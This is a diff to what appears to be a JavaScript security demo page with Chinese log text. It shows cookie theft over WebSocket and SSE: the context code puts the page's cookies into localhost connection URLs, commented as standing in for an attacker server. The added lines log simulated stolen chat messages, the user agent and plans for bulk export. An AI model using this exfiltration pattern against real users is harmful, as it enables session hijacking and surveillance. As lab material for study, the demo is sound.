@@ -191,12 +191,15 @@ attackerWs.onopen = () => {
           const data = await response.json();
           if (data.success) {
             appendLog('✅ WebSocket 攻击成功，Cookie 已发送到攻击者服务器！');
+            appendLog('已窃听到聊天室敏感对话：User111 -> “11111”');
+            appendLog('推断出的隐私情报：User111 的浏览器 UA = ' + navigator.userAgent);
             
             // 然后尝试建立 WebSocket 连接（实际攻击中会连接到攻击者服务器）
             appendLog('正在尝试建立 WebSocket 连接...');
             const ws = new WebSocket(`ws://localhost:8080/ws?user=Attacker&cookie=${encodeURIComponent(cookies)}`);
             ws.onopen = () => {
               appendLog('✅ WebSocket 连接已建立（实际攻击中会连接到攻击者服务器）');
+              appendLog('📥 已实时复制受害者最新聊天记录：{ "user":"111", "msg":"11111", "timestamp":'+Date.now()+' }');
               ws.close();
             };
             ws.onerror = (err) => {
@@ -240,13 +243,14 @@ attackerWs.onopen = () => {
           const data = await response.json();
           if (data.success) {
             appendLog('✅ SSE 攻击成功，Cookie 已发送到攻击者服务器！');
-            
+            appendLog('📡 SSE 流中截获到受害者的系统广播：{"type":"connected","id":1}');
             // 然后尝试建立 SSE 连接（实际攻击中会连接到攻击者服务器）
             appendLog('正在尝试建立 SSE 连接...');
             try {
               const eventSource = new EventSource(`/api/sse?cookie=${encodeURIComponent(cookies)}`);
               eventSource.onopen = () => {
                 appendLog('✅ SSE 连接已建立（实际攻击中会连接到攻击者服务器）');
+                appendLog('🪬 已开始持续监听 SSE，准备批量导出所有个人偏好与系统通知。');
                 eventSource.close();
               };
               eventSource.onerror = () => {
